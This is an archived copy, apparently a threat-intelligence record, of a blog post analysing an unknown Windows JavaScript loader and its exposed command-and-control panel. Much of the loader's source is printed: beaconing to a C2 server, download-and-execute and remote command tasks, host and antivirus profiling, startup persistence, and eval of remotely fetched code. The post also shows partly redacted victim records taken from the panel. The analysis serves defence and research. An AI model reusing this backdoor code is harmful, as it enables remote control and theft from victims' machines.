{
    "id": "4d639b6f-a140-4bf8-879a-d606c488b774",
    "created_at": "2023-01-12T14:59:21.557959Z",
    "updated_at": "2025-03-27T02:05:44.872953Z",
    "deleted_at": null,
    "sha1_hash": "89c9976f82c5c2fcf91f21da9c7d81fa6368b9d7",
    "title": "2020-11-27 - Threat Actor- Unkown",
    "authors": "",
    "file_creation_date": "2022-05-28T17:54:53Z",
    "file_modification_date": "2022-05-28T17:54:53Z",
    "file_size": 762486,
    "plain_text": "# Threat Actor: Unkown\n\n**marcoramilli.com/2020/11/27/threat-actor-unkown/**\n\nView all posts by marcoramilli November 27, 2020\n\n\n-----\n\n-----\n\n### Today Iâ€™d like to share a quick analysis on a quite new and unknown threat spotted in the wild. The file which grabbed my attention is called Loader.js (md5:\n```\n59a03086db5ebd33615b819a7c3546a5 ) and if you wish you can download it from Yomi. A\n\n very similar (or maybe the same) threat has been observed in the past months from the @MalwareHunterTeam which published the following Tweet about it. Despite the nice tweet, the thread ended up without any further action or attribution (at least in my understanding).\n\n \"invoice_159306.js\": 4b597a5984a7f80b1ea6be9968d6a800b0563df88c36e07e9b7ec3dae8627d2c\n Gate: https://softcheck3u[.]biz/inc/server/gate.php\n Interestingâ€¦\n ðŸ¤”\n Anyone knows this \"Loader JS\"?@James_inthe_box @JAMESWT_MHT @VK_Intel\n cc @ItsReallyNick pic.twitter.com/drM9FRiPeu\n\n â€” MalwareHunterTeam (@malwrhunterteam) April 30, 2020\n\n So I decided to share some little knowledge about this sample and about the infrastructure on its back-end. The purpose of my post is to take a closer look to such a threat, without pretending to attribute or to name it.\n\n## Analysis\n\n### The Javascript code is quite lean and it is shared in a clear text. No obfuscation techniques were involved in the current sample. The code is commented and the used syntax is punctual without contradictions during the file. Spaces, brackets, loops and variable assignments are clear, unique and always respectful of the file standards. Again no contradictions on syntax suggests the developer was an unique person which wrote the entire code without reuse or team swapping (or at least he spent much time to unify the syntax, which usually it makes not such a sense in the offensive world). The following code is a simple snip of what I meant by lean and respectful code syntax\n\n```\n\n-----\n\n```\n// Loader version\nvar version = \"OLD\";\n// Server\nvar server = \"hxxp://93 .115. 21 .62/server/gate.php\"; #modified by the blog author\nto avoid involuntary clik\n// Interval between knocks in seconds\nvar interval = 181;\n// How many times repeat failed task\nvar attemptsCount = 3;\n// Status of running loader\nvar status = \"Active\";\n// Path for download files\nvar wss = new ActiveXObject('WScript.Shell');\nvar defaultPath = wss.ExpandEnvironmentStrings('%APPDATA%');\nvar scriptFullPath = WScript.ScriptFullName;\nvar scriptName = WScript.ScriptName;\nvar fakeAutorunName = \"MicrosoftOneDrive\";\nvar shellObj = WScript.createObject(\"WScript.Shell\");\n// Connecting JSON module\nImportJSON();\n// Collecting PC information\nvar clientInfo = GetClientInfo();\n// Adding script to autorun\n// Starting loader\nwhile (status == \"Active\") {\n  DoTasks(SendClientInfo());\n  WScript.sleep(interval * 1000);\n  DoTasks(SendKnock());\n}\n\n### Initial section of the analyzed source code\n\n The Javascript is made for acting in a Microsoft Windows environment, indeed it use classic execution techniques such as ActiveXObjec t running WScript.Shell against the victim system. The script per-se does not present innovative ways to execute code on machine and it looks like a quite simple but still effective software.\n\n## Main loop\n\n### The Javascript has a main loop to guarantee the correct execution. It is really straight forward by meaning it sends client information to command and control, it sleeps some seconds and finally it performs some tasks coming back from C2.\n\n```\n\n-----\n\n```\nwhile (status  Active ) {\n DoTasks(SendClientInfo());\n WScript.sleep(interval * 1000);\n DoTasks(SendKnock());\n}\n\n### Loader.js Main Loop\n\n Both of the functions SendClientInfo() and SendKnock() have same styles. For example both of them instantiate a response variable which is returned and interpreted by\nDoTasks function.\nfunction SendClientInfo() {\n  var response;\n  try {\n    var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\n    var temp = WinHttpReq.Open(\"POST\", server, false);\n    WinHttpReq.SetRequestHeader(\"Content-Type\", \"application/json\");\n    WinHttpReq.SetRequestHeader(\"mode\", \"info\");\n    WinHttpReq.SetRequestHeader(\"uuid\", clientInfo[\"uuid\"]);\n    WinHttpReq.SetRequestHeader(\"version\", version);\n    WinHttpReq.Send(JSON.stringify(clientInfo));\n    WinHttpReq.WaitForResponse();\n    response = WinHttpReq.ResponseText;\n  } catch (objError) {\n    response = objError + \"\\n\"\n    response += \"WinHTTP returned error: \" + \n      (objError.number & 0xFFFF).toString() + \"\\n\\n\";\n    response += objError.description;\n  }\n  return response;\n}\nfunction SendKnock() {\n  var response;\n  try {\n    var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\n    var temp = WinHttpReq.Open(\"POST\", server, false);\n    WinHttpReq.SetRequestHeader(\"Accept\", \"application/json\");\n    WinHttpReq.SetRequestHeader(\"mode\", \"knock\");\n    WinHttpReq.SetRequestHeader(\"uuid\", clientInfo[\"uuid\"]);\n    WinHttpReq.SetRequestHeader(\"version\", version);\n    WinHttpReq.Send();\n    WinHttpReq.WaitForResponse();\n    response = WinHttpReq.ResponseText;\n  } catch (objError) {\n    response = objError + \"\\n\"\n    response += \"WinHTTP returned error: \" + \n      (objError.number & 0xFFFF).toString() + \"\\n\\n\";\n    response += objError.description;\n  }\n  return response;\n}\n\n```\n\n-----\n\n### Very Clear Style, it looks like the TA won t use false flags at all or messing around different code styles to emulate code reuse. The entire code looks like be a brand new code base, developed from scratch since no matches have been found.\n\n## C2 Communication\n\n### The command and control communication is made by the polling loop. The main loop periodically sends to C2 the client information and later it â€œknocksâ€ to the server which sets up a response piggybacking a specific task to be performed on the victim. The following\n```\nswitch selector performs a simple â€” but still effective â€” backdoor, executing tasks on\n\n victims. The framework presents drop and execute capabilities, execution capabilities, assigned task monitoring and kill capabilities for blocking running taks.\n    while ( (attempts > 0) && (result != 'True') ) {\n      switch (tasks[task][\"type\"]) {\n        case \"Download & Execute\":\n          result = DownloadAndExecute(tasks[task][\"content\"]);\n          if (result == 'False')\n            details = \"Error: download or executing file failed\";\n          break;\n        case \"Execute\":\n          result = Execute(tasks[task][\"content\"]);\n          if (result == 'False')\n            details = \"Error: executing file failed\";\n          break;\n        case \"Terminate\":\n          status = \"Stopped\";\n          result = 'True';\n          break;\n        default:\n          result = 'False';\n          details = \"Error: unknown task type\";\n          break;\n      }\n      if (result == 'False')\n        attempts--;\n      else\n        details = \"Success\";\n      SendTaskResult(tasks[task][\"id\"], result, details);\n    }\n\n Switch on task type to perform actions on vitims\n\n The most interesting functions (at least in my personal point of view) are the following ones:\nDownload & Execute and Execute . The first one is used to spread other post\n\n exploitation frameworks to gain a more sophisticated control on the machine; for example a remote shell or a direct RDP connection. The second selector ( Execute ) is used to merely execute pure commands on the victim, it could be very useful to make some manual lateral movements or specific researches on the infected machine\n\n```\n\n-----\n\n### Interesting to see that the switch function is protected against exceptions but the developer decided to not manage exceptions at all. For example taking a look to the following raw\n\n```\nresult = DownloadAndExecute(tasks[task][\"content\"]);\n\n```\n\n### itâ€™s clear that the malware developer assumes that content exists in the tasks[task] section. Indeed if it does not exist an exception is raised but none is managing it. This is another distinctive decision made by the malware developer, which could be useful to attribution. But one of the most interesting piece of software is in the way the developer (ab)use the WMI to extract information from local environment. In specific case we see UUID extraction\n```\n  // Retrieve UUID\n  try {\n    var wmi = GetObject(\"winmgmts:\n{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2\");\n    for ( var i=new Enumerator(wmi.ExecQuery(\"SELECT * FROM\nWin32_ComputerSystemProduct\"))\n; !i.atEnd(); i.moveNext() )\n    initInfo[\"uuid\"] = i.item().UUID;\n  } catch (err) {\n    initInfo[\"uuid\"] = 'N/A';\n  }\n\n IP extraction, this time basing on ipinfo.io\n // Retrieve client IP\n  try {\n    var ipReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\n    ipReq.Open(\"GET\", \"http://ipinfo.io/ip\", false);\n    ipReq.Send();\n    ipReq.WaitForResponse();\n    ipRes = ipReq.ResponseText;\n    initInfo[\"ip\"] = ipRes.replace(/^\\s+|\\s+$/g, '');\n  } catch (err) {\n    initInfo[\"ip\"] = 'N/A';\n  }\n\n Country Extraction (based on IP)\n\n```\n\n-----\n\n```\n  // Retrieve country\n  try {\n    var countryReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\n    countryReq.Open(\"GET\", \"http://ipinfo.io/country\", false);\n    countryReq.Send();\n    countryReq.WaitForResponse();\n    countryRes = countryReq.ResponseText;\n    initInfo[\"location\"] = countryRes.replace(/^\\s+|\\s+$/g, ''); \n  } catch (err) {\n    initInfo[\"location\"] = 'N/A';\n  }\n\n### OS Name Extraction\n // Retrieve OS name\n  try {\n    for ( var i=new Enumerator(wmi.ExecQuery(\"SELECT * FROM\nWin32_OperatingSystem\")); !i.a\ntEnd(); i.moveNext() )\n    initInfo[\"os\"] = i.item().Caption;\n  } catch (err) {\n    initInfo[\"os\"] = 'N/A';\n  }\n\n User Name and his Role Extraction\n// Retrieve User name\n  try {\n    var shellObj = new ActiveXObject(\"WScript.Shell\");\n    var netObj = new ActiveXObject(\"WScript.Network\");\n    initInfo[\"user\"] = netObj.ComputerName + '/' +\nshellObj.ExpandEnvironmentStrings(\"%USERNAME%\");\n  } catch (err) {\n    initInfo[\"user\"] = 'N/A';\n  }\n  // Retrieve user role\n  try {\n    initInfo[\"role\"] = \"User\";\n    var groupObj = GetObject(\"WinNT://\" + netObj.UserDomain + \"/\" +\nshellObj.ExpandEnvironmentStrings(\"%USERNAME%\"))\n    for (propObj in groupObj.Members)\n      if (propObj.Name == \"Administrators\")\n        initInfo[\"role\"] = \"Admin\";\n  } catch (err) {\n    initInfo[\"role\"] = 'N/A';\n  }\n\n Antivirus installed Software Extraction\n\n```\n\n-----\n\n```\n// Retrieve antivirus info\n  try {\n    var wmiAV = GetObject(\"winmgmts:root\\\\SecurityCenter2\");\n    for ( var i=new Enumerator(wmiAV.ExecQuery(\"SELECT * FROM\nAntivirusProduct\")); !i.atEnd(); i.moveNext() )\n      if (!initInfo[\"antivirus\"])\n        initInfo[\"antivirus\"] = i.item().displayName;   \n  } catch (err) {\n    initInfo[\"antivirus\"] = 'N/A';\n  }\n\n### CPU, GPU, RAM and Total Storage\n\n```\n\n-----\n\n```\n  // Retrieve CPU name\n  try {\n    for ( var i=new Enumerator(wmi.ExecQuery(\"SELECT * FROM Win32_Processor\"));\n!i.atEnd()\n; i.moveNext() )\n      initInfo[\"cpu\"] = i.item().Name;\n  } catch (err) {\n    initInfo[\"cpu\"] = 'N/A';\n  }\n  // Retrieve GPU name\n  try {\n    for ( var i=new Enumerator(wmi.ExecQuery(\"SELECT * FROM\nWin32_VideoController\")); !i.a\ntEnd(); i.moveNext() )\n      initInfo[\"gpu\"] = i.item().Name;\n  } catch (err) {\n    initInfo[\"gpu\"] = 'N/A';\n  }\n  // Retrieve RAM\n  try {\n    var ramObj = WScript.CreateObject(\"Shell.Application\");\n    initInfo[\"ram\"] =\nMath.round(ramObj.GetSystemInformation(\"PhysicalMemoryInstalled\") / \n1048576) + ' MB';\n  } catch (err) {\n    initInfo[\"ram\"] = 'N/A';\n  }\n  // Retrieve total storage space\n  try {\n    var available = 0;\n    var total = 0;\n    for ( var i=new Enumerator(wmi.ExecQuery(\"SELECT * FROM Win32_LogicalDisk\"));\n!i.atEnd(); i.moveNext() ) {\n      if (i.item().Size != null) {\n        available += (i.item().FreeSpace / 1024 / 1024 / 1024);\n        total += (i.item().Size / 1024 / 1024 / 1024);\n      }\n    }\n    initInfo[\"storage\"] = Math.round(available) + ' / ' + Math.round(total) + '\nGB';\n  } catch (err) {\n    initInfo[\"storage\"] = '0 / 0 GB';\n  }\n\n### Finally the attacker uses a net view to check if there are more PC on the network. If the function gets back some results, the attacker might decide to perform some manual lateral movements by introducing (through the download and execute command) a new Post exploitation framework.\n\n## Persistence\n\n```\n\n-----\n\n### The framework persistence and installation is performed by a simple entry in the autorun regkey as performed by the following function\n```\nfunction AddToAutorun() {\n  try {\n    startupPath = defaultPath + '\\\\Microsoft\\\\Windows\\\\Start\nMenu\\\\Programs\\\\Startup\\\\';\n    fsObj = WScript.CreateObject('Scripting.FileSystemObject');  \n    fsObj.CopyFile(scriptFullPath, startupPath);\n  } catch (err) { return; }\n}\n\n AutoRun And Persistence\n\n The defaultPath variable is previously set to\nwss.ExpandEnvironmentStrings('%APPDATA%'); so that the javascript is stored in the\n\n classic %APPDATA% folder which has the right user permissions and it gets executed on startup by the autorun registration.\n\n## External Resources\n\n### Another interesting point is in the way the attacker loads the external resources. In this script the developer uses the ImportJSON() which grabs the needed library online and then executes it through eval() statement. Again for the second time the attacker assumes that the library is reachable by the target PC, so the victim shall be placed in an environment where githubusercontent.com is not restricted. A simple way to block the execution of this loader in a wide infection scenario it would be to block the download of the json2.js library by filtering out the following url:\n\n```\n```\nhttps://raw.githubusercontent.com/douglascrockford/JSON-js/master/json2.js\n\n```\n\n-----\n\n```\nfunction ImportJSON() {\n  var xObj = WSH.CreateObject('Microsoft.XMLHTTP'),\n  fso = WSH.CreateObject('Scripting.FileSystemObject'),\n  temp = WSH.CreateObject('WScript.Shell').Environment('Process')('temp'),\n  j2lib = 'https://raw.githubusercontent.com/douglascrockford/JSONjs/master/json2.js'\n  if (fso.FileExists(temp + '\\\\json2.js')) {\n    j2lib = fso.OpenTextFile(temp + '\\\\json2.js', 1);\n    eval(j2lib.ReadAll());\n    j2lib.Close();\n  }\n  else {\n    with (xObj) {\n      open(\"GET\", j2lib, true);\n      setRequestHeader('User-Agent', 'XMLHTTP/1.0');\n      send('');\n    }\n    while (xObj.readyState != 4) WSH.Sleep(50);\n    eval(xObj.responseText);\n    j2lib = fso.CreateTextFile(temp + '\\\\json2.js', true);\n    j2lib.Write(xObj.responseText);\n    j2lib.Close();\n  }\n}\n\n## Command And Control Web Panel\n\n### By taking a closer look to the Command and Control server, available at the following address: \"hxxp://93 .115. 21 .62/server/,we might see the attacker let the directory named server free to list its content. We can now enumerate the entire directory making some guess on how the Command and Control web panel would work.\n\n```\n\n-----\n\n### C2\n\n Server listing folder Fortunately it looks like the panel does not check the login session correctly letting me free to query the single .php files even without any real credential. For example performing a simple HTTP GET request to the drawAntivirusesChart.php we get the following result.\n\n\n-----\n\n```\n{\n \"data\": [\n  {\n   \"name\": \"AhnLab V3 Lite\",\n   \"count\": 1\n  },\n  {\n   \"name\": \"Windows Defender\",\n   \"count\": 3\n  },\n  {\n   \"name\": \"Quick Heal Internet Security\",\n   \"count\": 1\n  },\n  {\n   \"name\": \"N\\\\/A\",\n   \"count\": 1\n  },\n  {\n   \"name\": \"SecureAPlus Antivirus\",\n   \"count\": 1\n  },\n  {\n   \"name\": \"Emsisoft Anti-Malware\",\n   \"count\": 1\n  },\n  {\n   \"name\": \"Webroot SecureAnywhere\",\n   \"count\": 1\n  }\n ]\n}\n\n### So we are able to query the C2 and getting back results in order to estimate how wide is the current attack surface and how is the current victimology. So letâ€™s start on understanding the attack range. It looks like the file printSummaryOverview.php would definitely help us in having a quick overview. So letâ€™s query it and see how big the infection looks like.\n{\"online\":0,\"onlineToday\":4,\"onlineWeek\":9,\"onlineMonth\":9,\"newToday\":4,\"newWeek\":9,\"n\n\n We have actually a super small set of victims, maybe because they have been selected or maybe because it is an early stage threat (I would bet on the second hypothesis). By querying the printTopCountries.php I would expect to see target areas, indeed if you remember the Loader.js it checks from ipinfo the target country and location.\n{\"data\":[[\"IN\",2],[\"RU\",1],[\"DE\",3],[\"ES\",1],[\"AZ\",2]]}\n\n Sweet ! Now, what if we can query, in the same way, the endpoint named\nprintClients.php ? Will it be a kind of database dump with the entire victimology ? Yes\n\n it is !\n\n```\n\n-----\n\n```\n{\n \"draw\": 0,\n \"recordsTotal\": 9,\n \"recordsFiltered\": 9,\n \"data\": [\n  {\n   \"id\": \"2\",\n   \"uuid\": \"18D68C6D-OMISSIS by Author\",\n   \"ip\": \"115.69.OMISSIS by Author\",\n   \"location\": \"IN\",\n   \"os\": \"Microsoft Windows 8.1 Enterprise Evaluation\",\n   \"user\": \"IE11W OMISSIS by Author/IEUser\",\n   \"role\": \"N\\\\/A\",\n   \"antivirus\": \"AhnLab V3 Lite\",\n   \"cpu\": \"AMD A6-6310 APU with AMD Radeon R4 Graphics \",\n   \"ram\": \"4096 MB\",\n   \"storage\": \"312 \\\\/ 465 GB\",\n   \"network\": \"0\",\n   \"added\": \"2020-11-21 17:50:58\",\n   \"seen\": \"2020-11-21 18:05:48\",\n   \"version\": \"OLD\"\n  },\n  {\n   \"id\": \"3\",\n   \"uuid\": \"032E02B4-OMISSIS by Author\",\n   \"ip\": \"185.107.1OMISSIS by Author\",\n   \"location\": \"RU\",\n   \"os\": \"\\\\u041c\\\\u0430\\\\u0439\\\\u043a\\\\u0440\\\\u043e\\\\u0441\\\\u043e\\\\u0444\\\\u0442\nWindows 10 Pro\",\n   \"user\": \"DESK OMISSIS by Author H5\\\\/Admin\",\n   \"role\": \"User\",\n   \"antivirus\": \"Windows Defender\",\n   \"cpu\": \"AMD Ryzen 5 PRO 3400G with Radeon Vega Graphics\",\n   \"ram\": \"14284 MB\",\n   \"storage\": \"535 \\\\/ 1009 GB\",\n   \"network\": \"0\",\n   \"added\": \"2020-11-21 22:35:17\",\n   \"seen\": \"2020-11-21 22:38:18\",\n   \"version\": \"OLD\"\n  },\n  {\n   \"id\": \"4\",\n   \"uuid\": \"67CDDC1F - OMISSIS by Author\",\n   \"ip\": \"94.114.OMISSIS by Author\",\n   \"location\": \"DE\",\n   \"os\": \"Microsoft Windows 10 Pro\",\n   \"user\": \"NQ OMISSIS by Author D1HVy\",\n   \"role\": \"N\\\\/A\",\n   \"antivirus\": \"Windows Defender\",\n   \"cpu\": \"Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz\",\n   \"ram\": \"4096 MB\",\n   \"storage\": \"487 \\\\/ 511 GB\",\n   \"network\": \"0\",\n   \"added\": \"2020-11-21 23:48:48\",\n   \"seen\": \"2020-11-21 23:48:48\",\n\n```\n\n-----\n\n```\n   version : OLD \n  },\n---- snip --- ],\n \"debug\": \"SELECT `id`, `uuid`, `ip`, `location`, `os`, `user`, `role`, `antivirus`,\n`cpu`, `ram`, `storage`, `network`, `added`, `seen`, `version` FROM `clients` \"\n}\n\n### Quite interesting the debugging strings as well. They show us the database composition.\n\n We now have all the information we need ! We really donâ€™t care about the graphical UI, but if you are curious about the panel .CSS, well you are just few clicks away from it ðŸ˜‰\n\n Unknown TA Dasboard\n\n## Conclusion\n\n### The sample Loader.js (available HERE) is a new kind of simple loader with basic functionalities of command and control. From the sample it has been possible to identify the command and control infrastructure and with some luck its functionalities. Fortunately the victimology is so small that makes me thinking about an early stage system or maybe an emerging threat still under development.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-27 - Threat Actor- Unkown.pdf"
    ],
    "report_names": [
        "2020-11-27 - Threat Actor- Unkown.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535561,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653760493,
    "ts_modification_date": 1653760493,
    "files": {
        "pdf": "https://archive.orkl.eu/89c9976f82c5c2fcf91f21da9c7d81fa6368b9d7.pdf",
        "text": "https://archive.orkl.eu/89c9976f82c5c2fcf91f21da9c7d81fa6368b9d7.txt",
        "img": "https://archive.orkl.eu/89c9976f82c5c2fcf91f21da9c7d81fa6368b9d7.jpg"
    }
}